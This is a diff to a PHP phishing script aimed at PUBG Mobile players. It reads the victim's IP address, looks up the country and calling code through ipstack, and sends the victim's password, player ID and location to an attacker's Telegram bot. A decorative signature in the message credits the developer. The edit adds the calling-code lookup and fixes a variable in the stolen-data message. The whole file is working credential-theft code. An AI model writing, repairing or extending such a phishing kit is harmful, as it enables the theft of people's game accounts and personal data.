@@ -44,7 +44,11 @@ $cty1 = file_get_contents("http://api.ipstack.com/".$ip."?access_key=".$api_key.
 $jsondata = json_decode($cty1);
 $cty = $jsondata->country_name;
 
-    
+$code1 = file_get_contents("http://api.ipstack.com/".$ip."?access_key=".$api_key."&format=1");
+
+$jsondata = json_decode($code1);
+
+$code = $jsondata->calling_code;
 
 
 $url1 = "https://www.midasbuy.com/events/register/pubgm?lan=en&v=4&from=__mds_buy_banner.events";
@@ -61,7 +65,7 @@ bot("sendMessage",[
    📟 • 𝙿𝚊𝚜𝚜𝚠𝚘𝚛𝚍 » `$password`
    💎 • 𝙿𝚕𝚊𝚢𝚎𝚛 𝙸𝙳 » $playid
    🏴 • 𝙲𝚘𝚞𝚗𝚝𝚛𝚢 » $cty
-   ☎️ • 𝙲𝚘𝚍𝚎 » `$code4`
+   ☎️ • 𝙲𝚘𝚍𝚎 » `$code`
    ⏲️ • 𝚃𝚒𝚖𝚎 » $time
    📝 • 𝙳𝚊𝚝𝚎 » $day/$month/$year
 ╰─────•𝙳𝙴𝚅 𝙱𝚈 @PHP505•──────╯
